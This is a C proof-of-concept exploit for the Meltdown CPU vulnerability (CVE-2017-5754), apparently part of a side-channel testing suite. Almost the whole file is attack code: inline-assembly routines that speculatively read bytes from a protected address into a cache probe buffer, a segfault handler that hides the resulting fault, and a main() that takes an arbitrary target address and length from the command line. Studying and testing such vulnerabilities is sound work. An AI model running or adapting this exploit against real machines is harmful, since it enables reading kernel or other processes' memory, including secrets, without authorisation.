/**
 * Meltdown: Rogue Data Cache Load (CVE-2017-5754)
 *
 * Description:
 *
 * Systems with microprocessors utilizing speculative execution
 * may allow unauthorized disclosure of information to an attacker with local user access
 * via a side-channel analysis of the data cache.
 *
 */

#include "tools.h"

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#ifndef MELTDOWN
#define MELTDOWN meltdown_fast
#endif

#define meltdown        1
#define meltdown_nonull 2
#define meltdown_fast   3
#if MELTDOWN == 1
#define VER "null"
#elif MELTDOWN == 2
#define VER "nonull"
#else
#define VER "fast"
#endif
#undef meltdown
#undef meltdown_nonull
#undef meltdown_fast

#define meltdown                        \
    asm volatile(                       \
        "1:\n"                          \
        "movq (%%rsi), %%rsi\n"         \
        "movzbq (%%rcx), %%rax\n"       \
        "shl $12, %%rax\n"              \
        "jz 1b\n"                       \
        "movq (%%rbx,%%rax,1), %%rbx\n" \
        :                               \
        : "c"(phys), "b"(mem), "S"(0)   \
        : "rax");

#define meltdown_nonull                 \
    asm volatile(                       \
        "1:\n"                          \
        "movzbq (%%rcx), %%rax\n"       \
        "shl $12, %%rax\n"              \
        "jz 1b\n"                       \
        "movq (%%rbx,%%rax,1), %%rbx\n" \
        :                               \
        : "c"(phys), "b"(mem)           \
        : "rax");

#define meltdown_fast                   \
    asm volatile(                       \
        "movzbq (%%rcx), %%rax\n"       \
        "shl $12, %%rax\n"              \
        "movq (%%rbx,%%rax,1), %%rbx\n" \
        :                               \
        : "c"(phys), "b"(mem)           \
        : "rax");

jmp_buf buf;

void unblock_signal(int signum) {
    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, signum);
    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}

void segfault_handler(int signum) {
    unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}

size_t exploit(size_t address, int tries) {
    uint8_t *phys = (uint8_t *)address;
    uint8_t *mem = buffer.table;
    
    if (!setjmp(buf)) {
        MELTDOWN;
    }
    
    // No index to exclude from Flush+Reload test
    return -1;
}

int main(int argc, const char **argv) {
    void *address = secret;
    size_t len = strlen(secret);
    
    if (argc == 3) {
        sscanf(argv[1], "%p", &address);
        sscanf(argv[2], "%zd", &len);
    }
    
    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
        printf("Failed to setup signal handler\n");
        return 1;
    }
    
    printf("CVE-2017-5754: Meltdown (%s)\n", VER);
    return execute(address, len, 1000, exploit);
}
